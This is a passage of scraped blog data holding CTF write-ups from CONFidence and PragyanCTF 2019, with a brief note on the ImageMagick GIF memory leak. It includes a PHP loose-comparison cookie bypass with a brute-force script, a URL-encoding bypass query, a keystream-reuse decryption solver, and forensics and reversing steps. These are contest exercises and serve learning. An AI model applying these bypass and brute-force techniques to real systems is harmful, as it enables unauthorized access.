00401C8C&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401C8F&#x27;, &#x27;c0 e8 04&#x27;], [&#x27; 00401C92&#x27;, &#x27;89 c1&#x27;], [&#x27; 00401C94&#x27;, &#x27;8b 45 fc&#x27;], [&#x27; 00401C97&#x27;, &#x27;8d 50 01&#x27;], [&#x27; 00401C9A&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C9D&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C9F&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401CA2&#x27;, &#x27;0f b6 c0&#x27;], [&#x27; 00401CA5&#x27;, &#x27;c1 e0 04&#x27;], [&#x27; 00401CA8&#x27;, &#x27;09 c1&#x27;], [&#x27; 00401CAA&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401CAD&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401CB0&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401CB2&#x27;, &#x27;89 ca&#x27;], [&#x27; 00401CB4&#x27;, &#x27;88 10&#x27;], [&#x27; 00401CB6&#x27;, &#x27;83 45 fc 01&#x27;], [&#x27; 00401CBA&#x27;, &#x27;0f 0b a2 5e a0 52&#x27;], [&#x27; 00401CC0&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401CC3&#x27;, &#x27;83 c0 1f&#x27;], [&#x27; 00401CC6&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401CC9&#x27;, &#x27;c0 e8 04&#x27;], [&#x27; 00401CCC&#x27;, &#x27;89 c2&#x27;], [&#x27; 00401CCE&#x27;, &#x27;0f b6 45 fb&#x27;], [&#x27; 00401CD2&#x27;, &#x27;c1 e0 04&#x27;], [&#x27; 00401CD5&#x27;, &#x27;09 c2&#x27;], [&#x27; 00401CD7&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401CDA&#x27;, &#x27;83 c0 1f&#x27;], [&#x27; 00401CDD&#x27;, &#x27;88 10&#x27;], [&#x27; 00401CDF&#x27;, &#x27;90&#x27;], [&#x27; 00401CE0&#x27;, &#x27;c9&#x27;], [&#x27; 00401CE1&#x27;, &#x27;c3 17 83 53 07 e4 38 78 a0 d0 7b 11 7a aa e8 d1&#x27;], [&#x27; 00401DFB&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401DFE&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E01&#x27;, &#x27;&#x27;], [&#x27; 00401CE2&#x27;, &#x27;55&#x27;], [&#x27; 00401CE3&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401CE5&#x27;, &#x27;81 ec c0 00 00 00&#x27;], [&#x27; 00401CEB&#x27;, &#x27;c7 45 f0 4c a0 43 00&#x27;], [&#x27; 00401CF2&#x27;, &#x27;c7 45 fc 00 00 00 00&#x27;], [&#x27; 00401CF9&#x27;, &#x27;eb 29 8f a5 2e b7 d5 f8 1f 88 b5 74 1f 9f ef c5&#x27;], [&#x27; 00401D24&#x27;, &#x27;83 7d fc 1f&#x27;], [&#x27; 00401D28&#x27;, &#x27;&#x27;], [&#x27; 00401CFB&#x27;, &#x27;8b 45 fc&#x27;], [&#x27; 00401CFE&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401D01&#x27;, &#x27;89 94 85 6c ff ff ff&#x27;], [&#x27; 00401D08&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401D0B&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401D0E&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D10&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401D13&#x27;, &#x27;8d 8d 4c ff ff ff&#x27;], [&#x27; 00401D19&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401D1C&#x27;, &#x27;01 ca&#x27;], [&#x27; 00401D1E&#x27;, &#x27;88 02&#x27;], [&#x27; 00401D20&#x27;, &#x27;83 45 fc 01&#x27;], [&#x27; 00401D24&#x27;, &#x27;0f 0b a2 5d a0 45&#x27;], [&#x27; 00401D2A&#x27;, &#x27;c7 45 f8 00 00 00 00&#x27;], [&#x27; 00401D31&#x27;, &#x27;eb 6b 8f a5 32 a9 71 82 0d 23 e2 ff 42 c5 e5 78&#x27;], [&#x27; 00401D9E&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401DA1&#x27;, &#x27;8b 45 f0&#x27;], [&#x27; 00401DA4&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401DA6&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401DA9&#x27;, &#x27;84 c0&#x27;], [&#x27; 00401DAB&#x27;, &#x27;&#x27;], [&#x27; 00401D33&#x27;, &#x27;8b 45 f8&#x27;], [&#x27; 00401D36&#x27;, &#x27;99&#x27;], [&#x27; 00401D37&#x27;, &#x27;c1 ea 1b&#x27;], [&#x27; 00401D3A&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D3C&#x27;, &#x27;83 e0 1f&#x27;], [&#x27; 00401D3F&#x27;, &#x27;29 d0&#x27;], [&#x27; 00401D41&#x27;, &#x27;8b 84 85 6c ff ff ff&#x27;], [&#x27; 00401D48&#x27;, &#x27;88 45 ef&#x27;], [&#x27; 00401D4B&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401D4E&#x27;, &#x27;8b 45 f0&#x27;], [&#x27; 00401D51&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D53&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401D56&#x27;, &#x27;0f b6 c0&#x27;], [&#x27; 00401D59&#x27;, &#x27;83 e0 1f&#x27;], [&#x27; 00401D5C&#x27;, &#x27;89 c1&#x27;], [&#x27; 00401D5E&#x27;, &#x27;8b 45 f8&#x27;], [&#x27; 00401D61&#x27;, &#x27;99&#x27;], [&#x27; 00401D62&#x27;, &#x27;c1 ea 1b&#x27;], [&#x27; 00401D65&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D67&#x27;, &#x27;83 e0 1f&#x27;], [&#x27; 00401D6A&#x27;, &#x27;29 d0&#x27;], [&#x27; 00401D6C&#x27;, &#x27;89 c2&#x27;], [&#x27; 00401D6E&#x27;, &#x27;8b 84 8d 6c ff ff ff&#x27;], [&#x27; 00401D75&#x27;, &#x27;89 84 95 6c ff ff ff&#x27;], [&#x27; 00401D7C&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401D7F&#x27;, &#x27;8b 45 f0&#x27;], [&#x27; 00401D82&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D84&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401D87&#x27;, &#x27;0f b6 c0&#x27;], [&#x27; 00401D8A&#x27;, &#x27;83 e0 1f&#x27;], [&#x27; 00401D8D&#x27;, &#x27;89 c2&#x27;], [&#x27; 00401D8F&#x27;, &#x27;0f b6 45 ef&#x27;], [&#x27; 00401D93&#x27;, &#x27;89 84 95 6c ff ff ff&#x27;], [&#x27; 00401D9A&#x27;, &#x27;83 45 f8 01&#x27;], [&#x27; 00401D9E&#x27;, &#x27;0f 0b a6 93 d1 ae 1d 46 0f 60 9e 9a 56 a9 90&#x27;], [&#x27; 00401DAD&#x27;, &#x27;c7 45 f4 00 00 00 00&#x27;], [&#x27; 00401DB4&#x27;, &#x27;eb 20 8f a5 36 b7 a6 6f 9a 19 f5 63 9f 0f 9a c5&#x27;], [&#x27; 00401DD6&#x27;, &#x27;83 7d f4 1f&#x27;], [&#x27; 00401DDA&#x27;, &#x27;&#x27;], [&#x27; 00401DB6&#x27;, &#x27;8b 45 f4&#x27;], [&#x27; 00401DB9&#x27;, &#x27;8b 84 85 6c ff ff ff&#x27;], [&#x27; 00401DC0&#x27;, &#x27;8b 4d f4&#x27;], [&#x27; 00401DC3&#x27;, &#x27;8b 55 08&#x27;], [&#x27; 00401DC6&#x27;, &#x27;01 ca&#x27;], [&#x27; 00401DC8&#x27;, &#x27;0f b6 84 05 4c ff ff ff&#x27;], [&#x27; 00401DD0&#x27;, &#x27;88 02&#x27;], [&#x27; 00401DD2&#x27;, &#x27;83 45 f4 01&#x27;], [&#x27; 00401DD6&#x27;, &#x27;0f 0b aa 5d a0 3c&#x27;], [&#x27; 00401DDC&#x27;, &#x27;90&#x27;], [&#x27; 00401DDD&#x27;, &#x27;c9&#x27;], [&#x27; 00401DDE&#x27;, &#x27;c3 17 83 53 05 e4 f4 8f 5f 0e b9 52 46 b0 5c 5c&#x27;], [&#x27; 00401E06&#x27;, &#x27;90&#x27;], [&#x27; 00401E07&#x27;, &#x27;c9&#x27;], [&#x27; 00401E08&#x27;, &#x27;c3 17 83 53 05 e4 e4 53 5f 1a a0 52 24 78 a9 c3&#x27;], [&#x27; 00401E23&#x27;, &#x27;83 45 fc 01&#x27;], [&#x27; 00401E27&#x27;, &#x27;0f 0b a2 6d a0 2b&#x27;], [&#x27; 00401E2D&#x27;, &#x27;90&#x27;], [&#x27; 00401E2E&#x27;, &#x27;c9&#x27;], [&#x27; 00401E2F&#x27;, &#x27;c3 17 83 53 05 e4 d0 53 5f 22 f8 b2 e1 78 09 8d&#x27;], [&#x27; 00401E48&#x27;, &#x27;c7 44 24 08 20 00 00 00&#x27;], [&#x27; 00401E50&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401E53&#x27;, &#x27;89 44 24 04&#x27;], [&#x27; 00401E57&#x27;, &#x27;8b 45 f4&#x27;], [&#x27; 00401E5A&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E5D&#x27;, &#x27;e8 fa 4f 03 00 d5 23 ab 8a f4 d5 c1 45 2d 51 53&#x27;], [&#x27; 00436E5C&#x27;, &#x27;&#x27;], [&#x27; 00401E62&#x27;, &#x27;85 c0&#x27;], [&#x27; 00401E64&#x27;, &#x27;0f 94 c0&#x27;], [&#x27; 00401E67&#x27;, &#x27;c9&#x27;], [&#x27; 00401E68&#x27;, &#x27;c3 17 83 53 05 e4 b0 53 a0 f2 d4 b2 e1 78 ac 09&#x27;], [&#x27; 00401EA6&#x27;, &#x27;88 45 f7&#x27;], [&#x27; 00401EA9&#x27;, &#x27;80 7d f7 00&#x27;], [&#x27; 00401EAD&#x27;, &#x27;74 0e 8f a5 06 6c 85 6b 88 3c 29 b3 85 58 ff 3d&#x27;], [&#x27; 00401EBD&#x27;, &#x27;c7 04 24 80 a1 43 00&#x27;], [&#x27; 00401EC4&#x27;, &#x27;e8 7b 4f 03 00&#x27;], [&#x27; 00401EC9&#x27;, &#x27;b8 00 00 00 00&#x27;], [&#x27; 00401ECE&#x27;, &#x27;c9&#x27;], [&#x27; 00401ECF&#x27;, &#x27;c3 5d 01 07 bd 3d 46 4c 55 bd d8 4f cc 7a 76 83&#x27;]] go_patch(patch) Now we can understand the control flow of the encoded binary.Anyway, reverse the operation to get the flag flag.pydef de_shuffle( decode ): s = map(ord,list(&quot;I am tired of Earth, these people. I&#x27;m tired of being caught in the tangle of their lives.&quot;)) num = [] t =[] for i in range(32): num.append(i) t.append(decode[i]) for j in range(len(s)): temp = num[j%32] num[j%32] = num[s[j]&amp;0x1f] num[s[j]&amp;0x1f] = temp for k in range(32): t[num[k]] = decode[k] return tdef de_xor( decode ): s = map(ord,list(&quot;October 12th, 1985. Tonight, a comedian died in New York&quot;)) for i in range(32): decode[i] = decode[i]^s[i] return decodedef de_shift(decode): ret = [0]*len(decode) for i in range(len(decode)): num = decode[i] n_1 = num &gt;&gt; 4 n = num &amp; 0b1111 ret[i] |= n &lt;&lt; 4 ret[(i+1)%len(ret)] |= n_1 return retfinal = [232, 244, 218, 241, 21, 198, 184, 189, 119, 140, 193, 249, 116, 70, 120, 186, 209, 78, 188, 58, 243, 109, 169, 97, 68, 97, 101, 19, 109, 61, 206, 123]for i in range(16): final = de_shuffle(final) final = de_shift(final) final = de_xor(final) Web::My admin panelTL;DRSet the value of otadmin in cookie to &#123;&quot;hash&quot;: 389&#125; flag:p4&#123;wtf_php_comparisons_how_do_they_work&#125; source codelogin.php.bk&lt;?phpinclude &#x27;../func.php&#x27;;include &#x27;../config.php&#x27;;if (!$_COOKIE[&#x27;otadmin&#x27;]) &#123; exit(&quot;Not authenticated.\\n&quot;);&#125;if (!preg_match(&#x27;/^&#123;&quot;hash&quot;: [0-9A-Z\\&quot;]+&#125;$/&#x27;, $_COOKIE[&#x27;otadmin&#x27;])) &#123; echo &quot;COOKIE TAMPERING xD IM A SECURITY EXPERT\\n&quot;; exit();&#125;$session_data = json_decode($_COOKIE[&#x27;otadmin&#x27;], true);if ($session_data === NULL) &#123; echo &quot;COOKIE TAMPERING xD IM A SECURITY EXPERT\\n&quot;; exit(); &#125;if ($session_data[&#x27;hash&#x27;] != strtoupper(MD5($cfg_pass))) &#123; echo(&quot;I CAN EVEN GIVE YOU A HINT XD \\n&quot;); for ($i = 0; i &lt; strlen(MD5(&#x27;xDdddddd&#x27;)); i++) &#123; echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0); &#125; // this if branch would print out &quot;I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400&quot; exit(&quot;\\n&quot;);&#125;display_admin(); detailsThe result of md5 (128-bit) would be represented as a sequence of 32 hexadecimal digits. So the meaning of hint is that 0 and 64 are the result of ord(digits)&amp;0xc0 and ord(letters)&amp;0xc0 respectively. Then, the $session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass)) is the key point, this is loose comparison. All we need to do is brute force the first three digits to pass this check. solve.pyimport requestsurl = &quot;https://gameserver.zajebistyc.tf/admin/login.php&quot;for i in range(100,1000): content = requests.get(url,cookies=&#123;&#x27;otadmin&#x27;:f&#x27;&#123;&#123;&quot;hash&quot;: &#123;i&#125;&#125;&#125;&#x27;&#125;).content if b&#x27;p4&#x27; in content: print(content,f&quot;hash = &#123;i&#125;&quot;) breakb&#x27;Congratulations! p4&#123;wtf_php_comparisons_how_do_they_work&#125;\\n&#x27; hash = 389 flagp4&#123;wtf_php_comparisons_how_do_they_work&#125; Crypto::Count me in!TL;DRThere is a bug inside the worker_function due to share a global variable among multiple workers, which causes that different workers use the same keystream to encrypt the plaintext. detailsThe bug is inside the worker_function. For example, in this scenario, the woker_0 is processing key_stream = aes.encrypt(pad(str(counter))), the counter is still 0, because the counter += 1 is not executed yet, what if the worker_1 is processing key_stream = aes.encrypt(pad(str(counter))) at the same time ? They are using the same keystream ! count.py...def worker_function(block): global counter key_stream = aes.encrypt(pad(str(counter))) result = xor_string(block, key_stream) counter += 1 return result... Find possible keys to decrypt flag: solver.pyfrom libnum import *import stringcipher = open(&quot;output.txt&quot;,&quot;r&quot;).read()cipher = [ cipher[i:i+32] for i in range(0,len(cipher),32)] ## slice cipher by a chunk size (16byte)plaintext = &quot;&quot;&quot;The Song of the CountYou know that I am called the CountBecause I really love to countI could sit and count all daySometimes I get carried awayI count slowly, slowly, slowly getting fasterOnce I&#x27;ve started counting it&#x27;s really hard to stopFaster, faster. It is so exciting!I could count forever, count until I drop1! 2! 3! 4!1-2-3-4, 1-2-3-4,1-2, i love couning whatever the ammount haha!1-2-3-4, heyyayayay heyayayay that&#x27;s the sound of the countI count the spiders on the wall...I count the cobwebs in the hall...I count the candles on the shelf...When I&#x27;m alone, I count myself!I count slowly, slowly, slowly getting fasterOnce I&#x27;ve started counting it&#x27;s really hard to stopFaster, faster. It is so exciting!I could count forever, count until I drop1! 2! 3! 4!1-2-3-4, 1-2-3-4, 1,2 I love counting whatever theammount! 1-2-3-4 heyayayay heayayay 1-2-3-4That&#x27;s the song of the Count!&quot;&quot;&quot;key = []for i in range(len(plaintext)/16): key.append(int(cipher[i],16)^s2n(plaintext[i*16:i*16+16]))unpad = lambda s : s if ord(s[-1]) &gt; 16 else s[0:-ord(s[-1])]flag = &quot;&quot;for i in range(len(plaintext)/16+1,len(cipher)): for j in key: s = unpad(n2s(int(cipher[i],16)^j)) if all( c in string.printable for c in s): flag += sprint flag# p4&#123;at_the_end_of_the_day_you_can_only_count_on_yourself&#125; Flag:p4&#123;at_the_end_of_the_day_you_can_only_count_on_yourself&#125; Misc","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"CONFidence","slug":"CONFidence","permalink":"http://blog.terrynini.tw/tags/CONFidence/"}]},{"title":"TIL::FaceBook_GIF_memory_exposure","slug":"TIL-FaceBook-GIF-memory-exposure","date":"2019-03-15T03:16:21.000Z","updated":"2019-03-15T06:12:57.000Z","comments":true,"path":"tw/TIL-FaceBook-GIF-memory-exposure/","permalink":"http://blog.terrynini.tw/tw/TIL-FaceBook-GIF-memory-exposure/","excerpt":"原文延伸 1GIF Palettes","text":"原文延伸 1GIF Palettes CVE-2017–15277在 ImageMagick（7.0.6–1）和 Graphicsmagick（1.3.26），在解析時，如果 GIF 中沒有定義任何的 palettes，會因為 palettes 的記憶體沒有進行任何初始化，導致上色的時候使用本來記憶體中殘留的資料造成記憶體洩漏。 原始 POC gifoeb 原文 及 延伸 1 的作者分別在 Facebook Message 及 HackerOne 上嘗試成功。","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"FaceBook","slug":"FaceBook","permalink":"http://blog.terrynini.tw/tags/FaceBook/"},{"name":"GIF","slug":"GIF","permalink":"http://blog.terrynini.tw/tags/GIF/"}]},{"title":"2019::PragyanCTF","slug":"2019-PragyanCTF","date":"2019-03-11T17:08:23.000Z","updated":"2019-03-20T18:55:32.000Z","comments":true,"path":"en/2019-PragyanCTF/","permalink":"http://blog.terrynini.tw/en/2019-PragyanCTF/","excerpt":"Wanna try ghidra in reversing so I play Pragyan CTF.Did not have time to solve them all.Pragyan CTF is a much easier CTF, a good target for me to start writing my blog……It’s a good way to force me to understand every details and improve my English writing skill (maybe).","text":"Wanna try ghidra in reversing so I play Pragyan CTF.Did not have time to solve them all.Pragyan CTF is a much easier CTF, a good target for me to start writing my blog……It’s a good way to force me to understand every details and improve my English writing skill (maybe). WebCookie MonsterThe value of flag in cookie is the md5 result of flag’s slices. bc54f4d60f1cec0f9a6cb70e13f2127a md5 pc114d6a415b3d04db792ca7c0da0c7a55 md5 tfb2984e12969ad3a3a2a4d334b8fb385a md5 &#123;c6f570c477ab64d17825ef2d2dfcb6fe4 md5 0o988287f7a1eb966ffc4e19bdbdeec7c3 md5 ki0d4896d431044c92de2840ed53b6fbbd md5 3sf355d719add62ceea8c150e5fbfae819 md5 _@12eccbdd9b32918131341f38907cbbb5 md5 re639307d281416ad0642faeaae1f098c4 md5 _y96bc320e4d72edda450c7a9abc8a214f md5 Umc716fb29298ad96a3b31757ec9755763 md5 _b51de5514f3c808babd19f42217fcba49 md5 Ut05cb7dc333ca611d0a8969704e39a9f0 md5 _tbc781c76baf5589eef4fb7b9247b89a0 md5 HEff108b961a844f859bd7c203b7366f8e md5 y_2349277280263dff980b0c8a4a10674b md5 @l0b1cdc9fe1f929e469c5a54ffe0b2ed5 md5 s0364641d04574146d9f88001e66b4410f md5 _rc758807125330006a4375357104f9a82 md5 3vfcfdc12fb4030a8c8a2e19cf7b075926 md5 Ea440c5c247c708c6e46783e47e3986889 md5 L_97a7bf81a216e803adfed8bd013f4b85 md5 @_c1d12de20210d8c1b35c367536e1c255 md5 l0a8655da06c5080d3f1eb6af7b514e309 md5 t&#125; flag:pctf&#123;c0oki3s_@re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t&#125; Game of FacesA form hidden behind the first color block, just upload any picture then you get a base64 encoded string which decoded as The_scroll_says=the_night_kingVSvalyrian.txt Get the flag at /the_night_kingVSvalyrian.txt flag:pctf&#123;You_L00K_Wi3Rd_IN_H3R3&#125; Mandatory PHPfinal solutionhttp://159.89.166.12:14000/?val2=WoAHh%2525252525252525252521&amp;val1=rUs&amp;val3=12&amp;val4=16 detail$a=hash(&quot;sha256&quot;,$a);$a=(log10($a**(0.5)))**2; Find a string which’s sha256 result’s prefix is 1e, so that it would be consider as scientific notation at first line. When $a=&#39;rUs&#39;, the result of sha256 is 1e40afafd2290d3f1e0cbc86cd9bbec0df8627b32730ea72e0dce67fe49a2f30, would be consider as $10^{40}$ at second line and the last result is 400, which is $12^2+16^2$, done. next check: for($i=1;$i&lt;=10;$i++)&#123; if($b==urldecode($b)) die(&#x27;duck&#x27;); else $b=urldecode($b);&#125;if($b===&quot;WoAHh!&quot;) It apply urldecode 10 times on $b, so we have to encode WoAHh! 10 times, also. The result should be WoAHh%25252525252525252521. But,the url would be decoded once by default, we have to do one more encode, which would be WoAHh%252525252525252525252521 flag:pctf&#123;b3_c4r3fu1_w1th_pHp_f31145&#125; ForensicsWelcomebinwalk -e welcome.jpegunzip d.zip The password for a.zip is in the secret.bmp, dGhlIHBhc3N3b3JkIGlzOiBoMzExMF90aDNyMyE==, decoded as the password is: h3110_th3r3!Then it give us a a.png, the flag is hidden in the white background flag:pctf&#123;st3gs0lv3_1s_u53ful&#125; Magic PNGsyou_cant_see_me.png is a broken png, fix it to get the password for tryme.zipFirst, fix the header , the header should be 8950 4e47 1d0a 1a0a instead of 8950 4e47 2e0a 2e0a.Next, find ascii string idat in png , this is the name of IDAT chunk, the string should be uppercase. Finally, fix two CRC checksums. then we get a picture of mask from movie V for Vendetta. According to the hint, the password for tryme.zip should be MD5 (&quot;h4CK3RM4n&quot;) = 2c919f82ee2ed6985d5c5e275d67e4f8 flag:pctf&#123;y0u_s33_m33_n0w!&#125; Save EarthSome usb packages, extract the Leftover Capture Data bytshark -r ./SaveEarth.pcap -T fields -e usb.capdata &gt; leftover.txt It doesn’t look like some keyboard strike or mouse position, but more like morse code. leftover.txt01:02:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:04:00:00:00:00:00:0001:01:00:00:00:00:00:0001:02:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:04:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:02:00:00:00:00:00:00 Get morse code $ cut -d &#x27;:&#x27; -f 2 leftover.txt | sed -e &quot;s/01/ /g&quot; -e &#x27;s/02/-/g&#x27; -e &#x27;s/04/./g&#x27; | tr -d &#x27;\\n&#x27;-.-. - ..-. ... ....- ...- ...-- -.-. - ..-. ... ....- ...- ...-- -&gt; CTFS4V3 flag is in lowercase flag:ctf&#123;s4v3&#125; Slow RealizationIt gives us a flag.pdf and a jpeg picture The EOF of jpeg file format is ff d9, so there is actually a mp3 file concated behind this jpeg. It’s OneRepublic - Counting Stars, but there are some morse code and a weird woman voice. The morse code is not the password, which is .--. .- - .. . -. -.-. . .. ... - .... . -.- . -.-- .--. -.-. - ..-. -. ----- - .... ...-- .-. ...--PATIENCE IS THE KEY PCTF N0T H3R3 I thought that the password is inside the vocal between morse code. Tried to apply reverse, invert, or normalize individually on it, but I still can not get a clear version of the woman voice Luckily, I get the password by dictionary attack…., it turns out to be congratulations, WHAT ?It really sounds like that after I knew the real password is congratualtions,but it also sounds like slow realization?Can someone teach me how to get the password in right way? flag:pctf&#123;y0u_h34rd_m3_r1ght&#125; Late PRstrings it, doneIs this the intended solution ?? flag:pctf&#123;Late_submissions_can_be_good&#125; CryptographySpoilerThere are some additional information concated after the %%EOF of pdf %%EOF0000006a0000006f0000006e000000730000006e0000006f000000770000006900000073000000640000007200000061000000670000006f0000006e00000062000000790000006200000069000000720000007400000068 It’s a hex string 6a6f6e736e6f776973647261676f6e62796269727468, xor it with another hex string show in pdf. flag:PCTF&#123;JON_IS_TARGARYEN&#125; Add them Sneaky PolynomialsWe get some polynomials equations: p = x^406 + x^405 + x^402 + x^399 + x^397 + x^391 + x^390 + x^387 + x^386 + x^378 + x^374 + x^372 + x^371 + x^369 + x^367 + x^364 + x^360 + x^358 + x^357 + x^352 + x^350 + x^345 + x^344 + x^341 + x^336 + x^335 + x^334 + x^333 + x^331 + x^330 + x^329 + x^328 + x^327 + x^324 + x^322 + x^320 + x^314 + x^311 + x^308 + x^307 + x^303 + x^300 + x^299 + x^296 + x^295 + x^290 + x^289 + x^287 + x^279 + x^271 + x^266 + x^264 + x^262 + x^260 + x^257 + x^256 + x^252 + x^249 + x^248 + x^246 + x^243 + x^239 + x^238 + x^236 + x^233 + x^230 + x^227 + x^225 + x^223 + x^222 + x^220 + x^218 + x^216 + x^215 + x^209 + x^208 + x^207 + x^204 + x^202 + x^199 + x^190 + x^189 + x^185 + x^184 + x^180 + x^177 + x^176 + x^175 + x^172 + x^167 + x^166 + x^162 + x^160 + x^159 + x^155 + x^154 + x^149 + x^147 + x^143 + x^137 + x^135 + x^131 + x^129 + x^126 + x^124 + x^122 + x^116 + x^110 + x^108 + x^105 + x^104 + x^100 + x^99 + x^97 + x^94 + x^93 + x^90 + x^88 + x^87 + x^86 + x^85 + x^83 + x^75 + x^73 + x^69 + x^63 + x^62 + x^57 + x^54 + x^51 + x^44 + x^41 + x^38 + x^37 + x^36 + x^34 + x^29 + x^28 + x^26 + x^25 + x^21 + x^20 + x^19 + x^16 + x^15 + x^14 + x^13 + x^6 + x^5 + x^2q = x^399 + x^398 + x^396 + x^393 + x^392 + x^391 + x^388 + x^386 + x^384 + x^381 + x^377 + x^376 + x^368 + x^364 + x^360 + x^355 + x^354 + x^353 + x^352 + x^348 + x^346 + x^345 + x^344 + x^343 + x^335 + x^334 + x^329 + x^326 + x^325 + x^321 + x^318 + x^317 + x^315 + x^314 + x^311 + x^307 + x^306 + x^304 + x^300 + x^296 + x^293 + x^291 + x^282 + x^277 + x^270 + x^263 + x^261 + x^260 + x^256 + x^254 + x^253 + x^252 + x^251 + x^248 + x^245 + x^242 + x^241 + x^239 + x^238 + x^236 + x^232 + x^226 + x^225 + x^222 + x^220 + x^219 + x^214 + x^209 + x^208 + x^207 + x^206 + x^202 + x^200 + x^196 + x^191 + x^190 + x^186 + x^181 + x^180 + x^178 + x^177 + x^169 + x^168 + x^165 + x^164 + x^163 + x^162 + x^161 + x^159 + x^157 + x^156 + x^151 + x^149 + x^148 + x^147 + x^146 + x^144 + x^141 + x^140 + x^138 + x^137 + x^136 + x^134 + x^133 + x^132 + x^130 + x^129 + x^128 + x^126 + x^123 + x^121 + x^113 + x^109 + x^103 + x^101 + x^100 + x^95 + x^93 + x^91 + x^85 + x^84 + x^81 + x^74 + x^73 + x^71 + x^68 + x^67 + x^54 + x^52 + x^51 + x^50 + x^48 + x^46 + x^45 + x^43 + x^39 + x^35 + x^32 + x^31 + x^30 + x^29 + x^21 + x^15 + x^14 + x^9 + x^8 + x^5 + x^4 + x^2 + 1r = x^404 + x^402 + x^396 + x^389 + x^387 + x^386 + x^384 + x^382 + x^376 + x^373 + x^367 + x^366 + x^365 + x^362 + x^361 + x^358 + x^356 + x^355 + x^354 + x^353 + x^352 + x^349 + x^348 + x^347 + x^345 + x^343 + x^340 + x^334 + x^332 + x^331 + x^328 + x^327 + x^326 + x^322 + x^317 + x^316 + x^314 + x^313 + x^312 + x^310 + x^309 + x^308 + x^305 + x^304 + x^303 + x^301 + x^300 + x^299 + x^296 + x^295 + x^292 + x^291 + x^290 + x^288 + x^287 + x^286 + x^285 + x^283 + x^279 + x^278 + x^274 + x^271 + x^269 + x^268 + x^266 + x^265 + x^263 + x^261 + x^260 + x^259 + x^258 + x^256 + x^254 + x^252 + x^251 + x^250 + x^249 + x^244 + x^243 + x^242 + x^237 + x^236 + x^228 + x^225 + x^224 + x^223 + x^222 + x^221 + x^215 + x^214 + x^213 + x^212 + x^205 + x^201 + x^200 + x^199 + x^197 + x^193 + x^192 + x^191 + x^190 + x^189 + x^188 + x^187 + x^182 + x^180 + x^175 + x^174 + x^173 + x^167 + x^166 + x^163 + x^158 + x^156 + x^155 + x^153 + x^151 + x^150 + x^149 + x^143 + x^142 + x^140 + x^139 + x^136 + x^135 + x^133 + x^129 + x^126 + x^125 + x^123 + x^121 + x^118 + x^117 + x^116 + x^115 + x^113 + x^110 + x^106 + x^105 + x^104 + x^103 + x^102 + x^98 + x^95 + x^92 + x^89 + x^87 + x^85 + x^81 + x^80 + x^77 + x^76 + x^75 + x^74 + x^71 + x^70 + x^67 + x^66 + x^64 + x^63 + x^60 + x^59 + x^58 + x^56 + x^54 + x^53 + x^48 + x^44 + x^41 + x^39 + x^38 + x^35 + x^34 + x^31 + x^29 + x^28 + x^27 + x^22 + x^21 + x^20 + x^17 + x^14 + x^12 + x^11 + x^10 + x^9 + x^6 + x^4 + x^3 + x + 1 According to challenge’s description, we can extract a string from these equations Obviously, if we plug x=2 into equations we can get some “binary strings”.For example, $2^5+2^4+2^2+2^1+1 &#x3D; 110111_{2} &#x3D; 55$, that is the ascii code for 7.After evaluation, we get some meaningless strings.But once we xor them together, the flag shows up flag:pctf&#123;f1n1t3_f13lds_4r3_m0r3_us3ful_th4n_y0u_th1nk&#125; The Order of the PhoenixAfter google the hint Eleven scientists are working on a secret project.......?, it’s a challenge about Shamir’s Secret Sharing. Read the content of QRcode first 